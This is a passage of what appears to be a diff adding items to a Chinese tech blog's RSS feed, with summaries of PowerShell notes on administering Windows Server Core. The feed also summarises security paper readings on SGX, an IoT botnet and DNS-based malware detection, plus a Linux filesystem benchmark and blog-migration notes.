+      <description>Windows Server Core 管理与 PowerShell 笔记（七）———— 防火墙与网络安全 这篇文章主要介绍 Windows 网络安全的相关知识。Windows Server 的工作核心是提供网络服务，因此不可避免的会有遭受攻击的风险。从这个角度说，Windows 的网络安全也是 Windows 安全的重要组成部分。&#xA;PowerShell 的 NetSecurity 模块提供了关于网络安全相关的命令，可以使得我们较为方便的对 Windows 的网络安全加以维护。在 NetSecurity 模块中，主要分为两部分指令。一部分是防火墙配置的相关指令。这些指令提供了对 Windows 防火墙不同细粒度的操作。另外一部分是 IPSec 协议的具体实现。IPSec 是一个 TCP/IP 网络层的安全协议，提供了加密、认证等功能。&#xA;由于篇幅原因。本文只介绍 Windows 防火墙有关的最基础指令，使用这些指令可以完成绝大部分的防火墙配置工作。更加高级的指令和 IPSec 相关指令暂且不介绍，如有需要可以具体查阅文档。&#xA;一、 Windows 防火墙概述 在 Windows Server 防火墙之中，预先定义了多种配置文件适用于不同的网络环境之下。主要有一下几种：&#xA;Domain 域环境。当计算机加入某一个特定域的时候，其防火墙边界扩展到域的边界。而对域内计算机信任程度较高。开启网络发现和文件共享服务。 Private 专有网路。当计算机处在某一个局域网（主要用于家庭和工作网络时），对于该网络中的设备比较信任。此时，开启网络发现和文件共享服务。 Public 公共网络。此时计算机处在公网之上。因此具有最严格的防火墙策略。此时文件共享和发现服务对外不可见。 Windows 防火墙由多组规则（Rule）所定义。每一个规则都可以设置规则名称、端口、方向、用户、IP、接口、应用程序、服务等属性。多个规则聚合成一些规则组，便于管理。每一个规则都可以设置成“允许”或者“拒绝”。&#xA;对于网络流量包，有默认三种处理方式：“全部允许”、“拒绝与规则不匹配的”以及“全部拒绝”三种默认动作。其中使用“拒绝与规则不匹配的”的策略时候，需要经过上面这些 Filter 进行过滤。只有留下的数据包才能够进入安全区。&#xA;二、Windows 防火墙配置文件设置 我们使用 Get-NetFirewallPrfile 命令来查看当前计算机的防火墙配置文件,以及配置文件中的属性。下面的例子可以看到防火墙的三组策略，并且全部开启。&#xA;PS C:\Windows\system32&amp;gt; Get-NetFirewallProfile | Format-Table Name,Enabled&#xD;Name Enabled&#xD;---- -------&#xD;Domain True&#xD;Private True&#xD;Public True 使用 Set-NetFirewallProfile 来设置防火墙配置属性（主要是是否开启、默认动作等）。例如：</description>
+    </item>
+    <item>
+      <title>Windows专题| Windows Server Core 管理与 PowerShell 笔记（六）———— 文件共享</title>
+      <link>https://www.elliot98.top/post/tech/ps6/</link>
+      <pubDate>Sat, 06 Apr 2019 10:54:41 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/ps6/</guid>
+      <description>Windows Server Core 管理与 PowerShell 笔记（六）———— 文件共享 一、SMB/CIFS 协议 Windows 使用 SMB/CIFS 协议来承载文件共享和打印机共享等网络共享服务。这一部分文章就将开始介绍 Windows 的文件共享相关知识和架构。主要包括文件共享设置、共享文件等权限设置、如何挂载网络驱动器等。 在 PowerShell 中，SMBShare 模块中的 Comlet 用来配置 SMB 共享，本文也将介绍该模块中的一些最常用的指令。&#xA;此外 Windows 还有网络文件系统（NFS）的相关指令。&#xA;二、管理 SMB 客户端和服务器端配置 在 PowerShell 中，主要使用 Get-SmbClientConfiguration 和 Set-SmbClientConfiguration 两个指令来读取和写入 SMB 客户端的配置信息。主要配置包括缓存寿命、超时时间等。通常情况下，这些配置不需要怎么改动。&#xA;同样使用 Get-SmbServerConfiguration 和 Set-SmbServerConfiguration 来读取和修改服务器端的配置信息。通常也按需修改即可。&#xA;三、管理文件共享 Get-SmbShare 和 Set-SmbShare 这一对指令可以用来查看和修改当前系统中的文件共享。&#xA;PS C:\Users\ertuil&amp;gt; Get-SmbShare&#xD;Name ScopeName Path Description&#xD;---- --------- ---- -----------&#xD;ADMIN$ * C:\Windows 远程管理&#xD;C$ * C:\ 默认共享&#xD;E$ * E:\ 默认共享&#xD;ertuil * C:\Users\ertuil&#xD;IPC$ * 远程 IPC&#xD;PS C:\Windows\system32&amp;gt; Set-SmbShare -Name &amp;#39;ertuil&amp;#39; -EncryptData $True&#xD;确认&#xD;是否确实要执行此操作?</description>
+    </item>
+    <item>
+      <title>Windows专题| Windows Server Core 管理与 PowerShell 笔记（五）———— 磁盘管理</title>
+      <link>https://www.elliot98.top/post/tech/ps5/</link>
+      <pubDate>Fri, 05 Apr 2019 21:53:22 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/ps5/</guid>
+      <description>Windows Server Core 管理与 PowerShell 笔记（五）———— 磁盘管理 在这一部分，我们将会介绍 PowerShell 如何管理磁盘以及如何设置文件网络共享。磁盘管理是系统管理中非常重要的一部分。&#xA;本部分文章不包括分布式文件系统（DFS）。&#xA;一、磁盘管理 1.1 Windows Server 磁盘模型 Windows 使用了最多四层结构来构建磁盘模型和文件系统。这个模型非常类似于 Linux 的 lvm 的概念。五层结构是：&#xA;PhysicalDisk 物理磁盘：表征一个具有物理实体的磁盘对象。 StoragePool 存储池：可以将多个物理磁盘聚合成一个大的存储池。 VirtualDIsk 虚拟磁盘：在存储池中，可以分割成多个虚拟磁盘。可以指定多种 raid 级别。 Partition 分区。可以在物理磁盘和虚拟磁盘的基础上，划分多个分区并格式化成各种文件格式。 Volume 卷。在分区中安装文件系统构成卷。 1.2 通用磁盘管理命令 命令 Get-Disk 将会列出所有的物理磁盘和虚拟磁盘。而 Get-PhysicalDisk 将只列出所有的物理磁盘。&#xA;PS C:\Users\ertuil&amp;gt; Get-Disk&#xD;Number Friendly Name Serial Number HealthStatus OperationalStatus Total Size Partition&#xD;Style&#xD;------ ------------- ------------- ------------ ----------------- ---------- ----------&#xD;2 VMware Vir... VMWare NVME-0000 Healthy Online 60 GB GPT&#xD;0 VMware Vir.</description>
+    </item>
+    <item>
+      <title>Windows专题| Windows Server Core 管理与 PowerShell 笔记（四）———— 本地访问控制</title>
+      <link>https://www.elliot98.top/post/tech/ps4/</link>
+      <pubDate>Fri, 05 Apr 2019 17:18:14 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/ps4/</guid>
+      <description>Windows Server Core 管理与 PowerShell 笔记（四）———— 本地访问控制 在上一篇文章中，我们介绍了关于 Windows 用户和用户组的相关操作。Windows 中最常用的登陆方式，就是基于用户口令的身份鉴别机制。 在本文中，我们将会进一步介绍 Windows 的访问控制策略。其中主要包括对于文件和其他各种系统资源的权限控制。&#xA;一、Windows 的文件访问权限策略 1.1 安全标识符（SID） Windows 对于所有的主体（包括用户、组、计算机等）都分配一个安全标识符，这类似于 Linux 中的 uid， gid， pid 等相关概念。 每一个安全标识符都对应了一个安全主体。&#xA;Windows 的 SID 由字母 S 开头，而后紧跟多个数字。分别代表了修订级别、颁发机构、子颁发机构、其余颁发机构以及相对标识符构成。&#xA;1.2 NTFS 文件权限 NTFS 和 ReFS 的文件权限基本类似，主要分为标准访问权限和特殊访问权限。简单的来说，标注访问权限的细粒度较粗，是多个特殊访问权限的结合， 在一般情况下使用标准访问权限就能够很好的对文件进行访问控制。特殊访问权限的划分非常细致，当有特殊需求的时候，可以使用特殊访问权限加以控制。 由于篇幅原因，我们只重点记录标准访问权限。&#xA;在 Windows 中，对于文件的标准访问控制权限主要有以下五种：&#xA;读取：读取文件内容、属性、扩展属性、权限。 写入：写入或者附加内容，写入属性和扩展属性。 读取和执行：比写入多了执行文件权限。 修改：除了读取、写入、执行权限之外，还能够删除该文件。 完全控制：上述所有权限，外加修改权限和获得所有权。 对于文件夹的标准访问控制权限主要有一下六种：&#xA;读取：列出该文件夹、读取属性、扩展属性以及权限。 写入：在文件夹内创建新的文件和文件夹，写入属性和扩展属性。 列出文件夹内容：比读取多一个列出该文件夹中内容的权限。 读取和执行：具有的权限与“列出文件夹内容”权限一样。但是在继承时有区别，所有文件夹都能继承该属性，而只有子文件夹才能继承“列出文件夹内容”属性。 修改：具有读取和写入的权限，外加删除该文件夹的权限。（但是没有删除子文件夹和文件的权限） 完全控制： 具有上述所有权限以及删除子文件夹、文件，更改权限、获得所有权。 1.3 文件权限的运算规则 权限最小化原则：尽量给用户分配最小的权限，而不分配过多权限。 累加原则：将用户以及用户所在的所用组的权限叠加，作为用户的权限。 拒绝有限：当用户某一个组具有拒绝权限时，则直接拒绝该权限。 继承原则：一个文件夹中的权限默认继承自该文件夹。当然，我们也可以设置权限不继承。注意之前有提到文件夹继承的特殊性。 另外，当使用 SMB 分享文件时，文件同时具有分享权限和NTFS权限。此时对权限取交集。&#xA;1.4 Windows 访问控制列表（ACL） 回顾 Linux 的文件权限控制。传统的 Linux 的访问控制，主要是划分为 属主、属组、其他人 三类来进行权限管理，当然还有其他机制在这里暂且不提。 在最近的发行版之中，开始加入了对于访问控制列表（ACL）的更加细致的文件访问控制方法。</description>
+    </item>
+    <item>
+      <title>Windows专题| Windows Server Core 管理与 PowerShell 笔记（三）———— 用户、组</title>
+      <link>https://www.elliot98.top/post/tech/ps3/</link>
+      <pubDate>Fri, 05 Apr 2019 09:49:02 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/ps3/</guid>
+      <description>Windows Server Core 管理与 PowerShell 笔记（三）———— 用户、组 本文将介绍 Windows 等用户和组管理，以及基于访问控制列表（ACL）提供的 Windows 基本访问控制机制。这里的内容其实已经在《计算机安全》的 “Windows 安全” 专题中有过一定的介绍。因此本文将从实用的角度介绍访问控制机制是如何作用的。&#xA;本文介绍的是本地的用户和组访问控制。基于活动目录（Active Directory）域控的强制访问控制，将会在 AD 章节专门介绍。&#xA;一、Windows 本地用户、本地组 与 Linux 类似，Windows 的访问控制主体主要是用户，并且具有组这一个中间层结构。此外基于访问控制列表（Access Control List）和特殊访问权限的机制，使得 Windows 可以实现比 Linux 更高细粒度的访问权限控制。&#xA;1.1 查看本地用户和组 Winodws 本地用户的相关信息，是存在与本地安全账户数据库（SAM）之中的，由此实现对登陆实体身份对鉴别。我们可以使用 Get-LocalUser 命令来查询本地用户信息：&#xA;PS C:\Users\ertuil&amp;gt; Get-LocalUser&#xD;Name Enabled Description&#xD;---- ------- -----------&#xD;Administrator True 管理计算机(域)的内置帐户&#xD;DefaultAccount False 系统管理的用户帐户。&#xD;ertuil True&#xD;Guest False 供来宾访问计算机或访问域的内置帐户&#xD;WDAGUtilityAccount False 系统为 Windows Defender 应用程序防护方案管理和使用的用户帐户。 在 Windows Server 2019 之中，对外可见对用户主要有如下账户。&#xA;Administrator 管理员账户，具有管理计算机的最高权限。 ertuil 个人用户账户 Guest 访客账户，没有被激活 同样的道理，我们可以使用 Get-LocalGroup Comlet 来查询当前有那些本地组：</description>
+    </item>
+    <item>
+      <title>Windows专题| Windows Server Core 管理与 PowerShell 笔记（二）———— 导航文件系统</title>
+      <link>https://www.elliot98.top/post/tech/ps2/</link>
+      <pubDate>Thu, 04 Apr 2019 08:36:09 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/ps2/</guid>
+      <description>Windows Server Core 管理与 PowerShell 笔记（二）———— 导航文件系统 这里我们将会简单记录 PowerShell 目录浏览的相关命令。此外还将介绍 PowerShell 的广义启动器变量。&#xA;一、PowerShell 的启动器变量 众所周知，Windows 将磁盘驱动器分配盘符，并使用盘符加以访问，比如 C:, D: 等。在 Windows PowerShell 中，驱动器将拥有更加广泛的内涵。我们通过命令 Get-PSDrive 来列出系统中有那些驱动器：&#xA;PS C:\Users\ertuil&amp;gt; Get-PSDrive&#xD;Name Used (GB) Free (GB) Provider Root CurrentLocation&#xD;---- --------- --------- -------- ---- ---------------&#xD;Alias Alias&#xD;C 16.34 23.33 FileSystem C:\ Users\ertuil&#xD;Cert Certificate \&#xD;D FileSystem D:\&#xD;Env Environment&#xD;Function Function&#xD;HKCU Registry HKEY_CURRENT_USER&#xD;HKLM Registry HKEY_LOCAL_MACHINE&#xD;Variable Variable&#xD;WSMan WSMan 从 Name 属性，可以获知每一个驱动器的名称。比如 C、D 等。从 Provider 属性可以看到除了传统的文件系统 FileSystem 之外，还可以看到更多的属性。</description>
+    </item>
+    <item>
+      <title>Windows专题| Windows Server Core 管理与 PowerShell 笔记（一）———— 基础配置</title>
+      <link>https://www.elliot98.top/post/tech/ps1/</link>
+      <pubDate>Wed, 03 Apr 2019 22:21:48 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/ps1/</guid>
+      <description>Windows Server Core 管理与 PowerShell 笔记（一）———— 基础配置 一、Windows Server Core 简介 Windows Server Core 是一个没有完整窗口界面的 Windows Server 版本。在安装 Windows Server 时，如果不选择安装“桌面体验”版本的 Window Server，那么则会安装 Windows Server Core。&#xA;启动 Windows Server Core 之后，就会默认打开一个 CMD 窗口。需要启动软件时，可以通过命令启动。另外，按下 Ctrl+alt+Del 可以打开管理界面。任务管理器中也可以启动新任务。除此之外，开始菜单、桌面、文件浏览器一概没有。&#xA;Windows Server Core 有如下好处：&#xA;没有完整的 GUI 界面，使得内存和硬盘占用更小，特别适合各种虚拟化环境。 没有 Internet Explorer、文件管理器、服务器管理器等常用应用，使得系统的攻击面更小。 可以更加快速的安装、部署和启动在各种容器虚拟化之中。 与此同时，也会有一些问题：&#xA;没有很多应用导致没有办法像正常的 Windows 图形界面那样使用和管理 Windows，只能够通过 PowerShell 来进行管理。 可能会导致部分功能缺失，比如缺少Internet Explorer，在使用 Invoke-WebRequest 命令（对应 wget）时，必须使用 -UseBasicParsing 参数，否则会调用并没有安装的浏览器组建来解析内容，因此会报错。 都这样了，为什么不用 Linux 呢？ 我也不知道！ 二、PowerShell 管理 Windows Server 基本配置 本文即以后可能的命令对于图形界面的 Windows 各种版本都能够使用（其实可以极大的提高桌面 Windows 的使用效率）。</description>
+    </item>
+    <item>
+      <title>Windows专题| Windows Server Core 管理与 PowerShell 笔记（零）———— 与 Windows Server 的初次相遇</title>
+      <link>https://www.elliot98.top/post/tech/ps0/</link>
+      <pubDate>Sun, 31 Mar 2019 17:32:22 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/ps0/</guid>
+      <description>Windows Server Core 管理与 PowerShell 笔记（零）———— 与 Windows Server 的初次相遇 对于一直使用 Linux 作为服务器操作系统的我，一直对 Windows Server 作为服务器的表现如何非常好奇。最近我读了关于 Windows Server 管理的书，也尝试迁移到 Windows Server 2019。这个系统给了我一个不同于 Linux 的全新体验。尽管使用时间并不长，也确实有一点点自己的感悟。正好借此写一点文字，尝试阐述一下我浅显的看法。&#xA;一切皆文件 or 一切皆对象 Linux 的哲学之一，就在于其系统的抽象（包括硬件、软件、进程甚至内存）都被抽象成为一个文件。一切配置都是在文本文件中进行。而 Windows 则截然不同，其大多抽象称为对象：系统的进程是一个个对象、窗口和句柄是一个个对象，注册表中的配置是一个个对象，用户是一个个对象。作为 Windows Server 的核心功能活动目录（AD）来说，也是用管理多种对象的方式实现域控这一个具体的问题。&#xA;其实从命令行的方式，就能够非常明显的认识到这一思想上的不同。 Linux 的命令行都是基于文本的，也正是这个原因， grep，awk，sed 这些文本命令会被大量的穿插于 shell 命令行之中。而 Windows 的 PowerShell 命令输入输出的，是一个个对象。举个简单的例子，终止所有进程名以 p 开头的进程。这个例子摘抄于网络，但是很能说明问题。Linux 下是这么写的:&#xA;ps -e | grep &amp;#34;^p&amp;#34; | awk &amp;#39;{ print $1 }&amp;#39; | xargs kill 在这个过程之中，我们需要使用 grep 来过滤以p开头的进程，用 awk 选取处进程的名字，最后送入 xargs 进行删除。再来看看 Windows 下是如何实现的：</description>
+    </item>
+    <item>
+      <title>技术摘要| Mac OS 与 Linux 的目录结构比较</title>
+      <link>https://www.elliot98.top/post/tech/macandlinuxdict/</link>
+      <pubDate>Thu, 28 Mar 2019 17:00:50 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/macandlinuxdict/</guid>
+      <description>Mac OS 与 Linux 的目录结构比较 从系统内核说起 传统 Linux 的内核是宏内核，其绝大部分功能都是由一个巨大的内核完成的。而Mac OS 的内核既不是宏内核，也不是微内核。从构成来看应当算混合内核，其核型组建是由卡耐基·梅隆大学开发的 Mach kernel ，其上实现了许多 FreeBSD 的众多组件。最终大部分系统调用都是由 UNIX/BSD 接口提供的，也因此其系统文件目录结构与 Linux 较为相似。&#xA;然而在 Linux 常见的文件存放位置确实与 MacOS 以及 FreeBSD 有较大区别，这也常常会给我们带来困扰。因此，有必要对其目录结构进行梳理。我们将从 Linux 的文件结构作为对照，给出相应的区别。&#xA;FreeBSD 与 Linux 的不同。 就笔者的感受而言，FreeBSD 与 Linux 的文件存放位置基本一致，只在细微之处存在一星半点的区别。主要有一下几点。&#xA;大部分情况下 Linux内核一般放置在 /boot 处，或者直接放在根目录下;而 FreeBSD 存放在 /boot/kernel/kernel 或者 /boot/kernel.old/kernel 中。这种命名很容易让人想起 Windows.old 文件夹，有异曲同工之妙。 FreeBSD 的核心系统和软件会跟随官方代码源 SVN 进行滚动，因此 /bin, /lib, /etc 等文件夹之中的大部分文件都是不建议修改的（会在升级时被覆盖），以此来保证系统的完整性和更新时候的稳定性。默认软件安装、配置全部存放于 /usr/local 之中的 bin, etc, lib, share 等文件夹之下。这样的好处就是用户软件和核心组建分离，不像 Linux 那样在大版本更新时经常遇到各种问题。 Mac OS 的文件系统 在 Majave（10.</description>
+    </item>
+    <item>
+      <title>论文笔记| Giving State to the Stateless: Augmenting Trustworthy Computation with Ledgers</title>
+      <link>https://www.elliot98.top/post/lab/big4-reading-4/</link>
+      <pubDate>Thu, 28 Mar 2019 11:53:11 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/big4-reading-4/</guid>
+      <description>Giving State to the Stateless: Augmenting Trustworthy Computation with Ledgers Gabriel Kaptchuk, Matthew Green, Ian Miers Network and Distributed Systems Security (NDSS) Symposium 2019 一、Introduction 该篇文章做了一次尝试，将可信计算平台（如 Intel SGX, ARM TrustZone 等）与区块链（如 BTC, ETH) 结合,期望实现无状态的可信计算。背景如下：&#xA;中心化和去中心化网络已经广泛使用，去中心化网络已被证明可以有更长的寿命和更高的可靠性。 有状态的可信计算环境可能会被攻击（需要外部存储非易失数据、以及监控网络流量等） 可信计算环境的硬件资源有限，特别是非易失存储资源的有限。 解决办法： 将有状态的可信计算环境（TEE）变更为无状态的TEE。使用类似传统 http 的模式提供计算服务。同时引入分布式账单（Ledger)来记录状态。文章给出了一个Host、TEE 和 Ledger 之间的三方协议，来实现该方案。&#xA;对于通常的服务，可以用如下公式形式化描述：P是给定程序，对于输入Ii，当前状态Si和随机代价ri，产生确定输出Oi和新的状态Si+1。&#xA;$$ P(I_i,S_i,r_i) \rightarrow O_i,S_i+1 $$&#xA;文章对上述模型做了一下修正，以提高安全性：&#xA;Attempt 1: 加密程序状态，无法抵御重放攻击 Attempt 2: 使用 Ledger 存储状态信息，也无法抵御回放攻击 Attempt 3: 使用 Ledger 绑定程序的输入。通过向 Ledger 中提交输入，可以解决上述攻击。 Attempt 4: 随机化。为了防止恶意Host 复制程序执行，采用伪随机数发生器，产生随机代价？？？ Extension 1: 减少 Ledger 带宽 &amp;hellip; Extension 2: 增加公共输入输出 Extension 3: 指定程序 二、模型 文章给出模型的三个参与者：</description>
+    </item>
+    <item>
+      <title>技术摘要| Linux 文件系统不专业评测</title>
+      <link>https://www.elliot98.top/post/tech/linux_filesystems/</link>
+      <pubDate>Wed, 27 Mar 2019 09:40:29 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/linux_filesystems/</guid>
+      <description>Linux 下文件系统性能的简单评测 其实这篇文章的数据源早在19年2月份就已经完成了 &amp;hellip; 主要是为了看看 Linux 系统中那么多文件系统在实际使用时的性能表现如何，特别是为了考察 2019 年初 btrfs 性能能否基本满足日常使用。值得注意的是，测试使用了 MacBook Pro 2016 的固态硬盘，对于机械硬盘结果可能有较大差别。&#xA;这次测试主要是在 Linux Kernel 4.20 和 3.10 两个版本中进行测试，可以看到在内核几年的发展过程中，文件系统的性能有了非常明显的提升。测试中还引入了 ZFS 这个广泛使用与 FreeBSD 的重量级文件系统，可惜不知道是不是笔者配置原因， openzfs 在 Linux 4.20 中没有办法使用，因此只有 3.10 的数据。&#xA;测试方法 为了忽略文件系统底层细节，也为了尽可能模拟日常使用中的任务。我选择使用 mdtest 工具，模拟文件的创建、读取、修改、删除；文件夹创建、读取、删除；以及文件树的创建、删除。每次测三次，取平均。&#xA;./mdtest -d /mnt/test/ -n 10000 -i 测试机器 Macbook Pro 2016 i5-6360u 8GB LPDDR3 256G PCIE SSD 数据 Kernel 3.10 Kernel 4.20 结论 从结论来看：&#xA;文件系统性能有着较大提升，其中 xfs 、 btrfs 等提升较为明显。 目前来看， ext2 文件系统性能最好，但是考虑到其年代过于久远，没有日志等特点，不再推荐使用。 ext3，ext4 文件系统性能也较为优异。 xfs, btrfs 等由于引入 COW 特性，导致对于文件删除性能有较大差距。 普遍来看，目前对于性能要求较高则推荐使用 xfs 和 ext4 文件系统。 btfrs 性能提升非常之大，如果需要使用其高级功能，则可以考虑使用（从官网上看，除了磁盘限额有性能问题、raid 5/6 模式可能有bug外基本稳定。 zfs 在 linux 下可能由于驱动原因，性能较差，不适合用于重度使用 </description>
+    </item>
+    <item>
+      <title>论文笔记| Measurement and Analysis of Hajime, a Peer-to-peer IoT Botnet</title>
+      <link>https://www.elliot98.top/post/lab/big4-reading-3/</link>
+      <pubDate>Tue, 26 Mar 2019 15:04:11 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/big4-reading-3/</guid>
+      <description>Measurement and Analysis of Hajime, a Peer-to-peer IoT Botnet Stephen Herwig, Katura Harvey, George Hughey, Richard Roberts, Dave Levin Network and Distrubuted Systems Security(NDSS) Symposium 2019 这篇文章主要介绍了作者近距离的观察了一个基于 P2P 协议的物联网僵尸网络。该网络目前没有发动过攻击的记录。&#xA;文章指出，该网络与其他僵尸网络的有一下显著特征：&#xA;并非传统中心化 command-and-control（C&amp;amp;C）网络，而是分布式的。 对于多种物联网芯片架构有着广泛的支持：mips、arm等 文章中说：该网络的卓越之处不在于其已经发生的攻击，而在于其让研究人员深刻的认识到了物联网设备的脆弱性。&#xA;论文中主要有如下发现：&#xA;物联网特征使得僵尸网络的规模变得很大（超过 95000 活跃机器） 各种 CPU 架构都容易遭受攻击。但是架构的分布与国家有明显相关性（美国感染设备大部分是 arm5 架构，而巴西则主要是 mips 设备。 设备的平均在线时间大约是 5 小时，其暗示物联网设备会经常性重启和重新感染。 物联网僵尸网络传播速度极快。 历程 论文观察到了僵尸网络的多次更新，这些更新常常伴随着新的漏洞的利用，导致大量新设备的感染。僵尸网络通过 uTP 协议对更新进行广播，每次更新后，可以观测程序更新迅速在网络中传播。&#xA;其他特性 论文观察了僵尸网络大小变化、感染设备寿命、地理位置分布、设备架构、攻击频率等性质。&#xA;有趣的是，文中指出中国广泛存在多个设备公用一个IP（暗示 nat 的使用），而巴西则同一个设备分配了多个 IP 地址。IP地址分配不均匀非常显著！&#xA;结论 Hajime 作为新的超大物联网僵尸网络，其规模已经 incredibly（豆豆口气）的大，地理分布广泛，且高可靠。研究该僵尸网络有助于观察互联网的各种特征。</description>
+    </item>
+    <item>
+      <title>论文笔记| Countering Malicious Processes with Process-DNS Association.</title>
+      <link>https://www.elliot98.top/post/lab/big4-reading-2/</link>
+      <pubDate>Tue, 26 Mar 2019 12:03:49 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/big4-reading-2/</guid>
+      <description>Countering Malicious Processes with Process-DNS Association. Suphannee Sivakorn, Kangkook Jee, Yixin Sun, Lauri Korts-Pa¨r, Zhichun Li, Cristian Lumezanu, Zhenyu Wu, Lu-An Tang, Ding Li. Ndss 2019 这篇论文主要讲了如何在企业服务器上设置 DNS 监控器来监控所有进程级别的DNS查询，通过地理位置、IP、查询时间、whois 等信息来辨别恶意进程。文章中实现了 PDNS 的模型来监控进程 DNS 查询，而后由机器学习网络和传统方式结合来标示恶意进程，实现了较高的准确率和较低的假阳性和假阴性率。 可能有一个问题在于其中获取了所有 DNS 查询的domain 、 频率、IP 等信息，并发送给服务器，可能导致隐私的泄露。这里是一个可以改进的地方。&#xA;Background 传统基于 dns 的查询只能区分到机器级别存在有风险的dns查询 目前大量恶意进程使用类似 twitter, github 等正常网站的服务来隐藏其恶意性，给传统 dns 检测机制带来挑战。 Archtecture PDNS 通过多种路径获取 Hosts 上的 DNS 查询记录。&#xA;客户机上 dns 查询情况及其他信息（IP 、domain、location 以及进程名、加载的动态链接库、查询频率、主机名、软件发布者签名及证书等信息） 网络上对于 DNS 链路的捕捉 Dns 服务器上的查询情况（记录的创建时间、生存时间、TTL、nameserver、域名、IP和域名的位置信息、whois信息等） 这些数据发送给 PDNS 服务器用于训练模型和预测。</description>
+    </item>
+    <item>
+      <title>论文笔记| OBLIVIATE:A Data Oblivious File System for Intel SGX</title>
+      <link>https://www.elliot98.top/post/lab/big4-reading-1/</link>
+      <pubDate>Tue, 26 Mar 2019 12:03:49 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/big4-reading-1/</guid>
+      <description>OBLIVIATE:A Data Oblivious File System for Intel SGX Adil Ahmad, Kyungtae Kim, Muhammad Ihsanulhaq Sarfaraz, Byoungyoung Lee. Ndss 2018 这篇主要讲了使用 SGX 技术实现了一个可用于web服务的混淆文件系统，用于在不可信服务器上提供隐私数据的 Web 服务。主要是用来对抗包括page failed等侧信道攻击。 该方案亮点在于结合了 SGX 和 ORAM 算法来混淆文件读取的偏移量等信息，使用 cmov 条件转移指令来混淆读取内存内容。但是性能上有一定损失。&#xA;为了应对三种 Side-Channel Attacks：&#xA;Syscall Snooping Attacks: SGX 调用 ocall 过程中，向内核泄漏信息。 Page Fault Attacks: 当 EPC 页面第一次加载时，触发 Page Fault Attacks，可能泄漏信息。 Cache Based Attacks：各级缓存中泄漏信息。 方案： SGX 和 ORAM 算法结合，来混淆对文件系统读取时的偏离量。Path ORAM 算法简介： 采用完全二叉树结构。叶子节点数等于真实节点数。灰色标记的 abcd 节点为真实数据节点，efg为dummy 节点（随机填充）。另外有一张 Position map 表（加密存放于 SGX 中，指向真实节点位置。</description>
+    </item>
+    <item>
+      <title>生活日志| 博客迁移计划</title>
+      <link>https://www.elliot98.top/post/life/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E8%AE%A1%E5%88%92/</link>
+      <pubDate>Mon, 25 Mar 2019 18:25:49 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/life/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E8%AE%A1%E5%88%92/</guid>
+      <description>Ertuil 的博客迁移计划 这已经是第三次！第三次！第三次！迁移博客了 &amp;hellip; 第一版本博客 第一次博客框架是使用阿里云搭建了一个 WordPress 。几年前的我对于如何搭建一个网站这种事并不清楚，当时历经千辛万苦，总算是勉勉强强运行起来了这个框架。说来可笑，当时是通过一键脚本跑出来的博客。即便这样，对于第一次通过自己域名访问博客的时候，我的内心可是相当兴奋。结果花费了好几天功夫来美化博客，也一口气写了好几篇文章。&#xA;还记得第一次阿里云天天提醒我 Wordpress 有漏洞的时候，可真紧张死我了。可是脚本部署的弊端就是我对其中的细节一概不知，或者说我的水平也不足以解决漏洞。很快我就发现了第二个问题：脚本对于我环境的侵入性极大，导致我无论在虚拟主机里做什么事，都畏手畏脚的。80端口被直接占用，导致我没有办法部署多个网站。这个时候，我开始思考重建博客了。&#xA;第二版本博客 我渐渐的开始学习后端的技术，学习了一点 Python，于是就想着自己重构博客。另一个目的就是为了学习 Django 。这一次，搭建博客花费了我好几天的时间，其中是枯燥的，却也收获了很多很多。但是，我那个时候对前端一点概念都没有，导致简单的 bootstrap 写出来的界面现在看来，只能用极丑来形容。&#xA;那个博客网站功能其实还挺全面的，包括了嵌入了一个 Markdown 编辑器，还选取了 Github 的样式。甚至还有评论系统。不过除了没有前端之外，还有一些非常严重安全问题，现在看来就是漏洞百出。好在访问量不大，没有被黑真的算是我的幸运。&#xA;第三版本博客 第三版本的博客构建的时机，正巧是我在参加 iGEM 比赛的这段日子里。这段时间，我主要的工作是前端代码的构建，因此我有机会去弥补我前端不足的短板。于是我用 Angular 框架静态构建出了第三版本的博客。是的，它和绝大部分静态博客框架一样，是一个完全没有后端的纯静态网站。&#xA;在那段时间里，我也逐渐学会了使用 Docker ，以至于能让我的虚拟主机发挥更大的功能。渐渐的，所有个人服务逐渐容器化，包括一个 Gitea 作为个人 git 仓库，以及一个 NextCloud 网盘等&#xA;我使用 git 来管理博文，正如 hexo 等静态博客一样。不过由于没有成熟的自动化部署脚本，写文章和上传文章还是有些复杂。我想要进一步简化 —— 使用 Wiki 来管理博文。&#xA;第四版本博客 第四版本博客正式你现在所看到到这样，使用 Seafile 开源网盘构建，其集成了 Wiki 功能，非常便于使用 Markdown 来实现博客到功能。同时 Seafile 还可以作为网盘使用，非常方便。</description>
+    </item>
+    <item>
+      <title>User Guide of BioHub 3.0</title>
+      <link>https://www.elliot98.top/post/tech/user-guide-of-biohub-3.0/</link>
+      <pubDate>Mon, 25 Mar 2019 17:46:13 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/user-guide-of-biohub-3.0/</guid>
+      <description>User Guide of BioHub 3.0 Overview The brand new BioHub 3.0 has arrived to make your job easier than ever before. This year we bring you a new way to edit your reports and search whatever you need in one step. Here are some new features:&#xA;An editor which can automatically compile your experimental reports. An intelligent search engine based on machine learning. A society that shares your ideas. Click here to take it a try.</description>
+    </item>
+    <item>
+      <title>技术摘要| Ertuil VIM 配置</title>
+      <link>https://www.elliot98.top/post/tech/ertuil-vim-%E9%85%8D%E7%BD%AE/</link>
+      <pubDate>Mon, 25 Mar 2019 17:46:13 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/ertuil-vim-%E9%85%8D%E7%BD%AE/</guid>
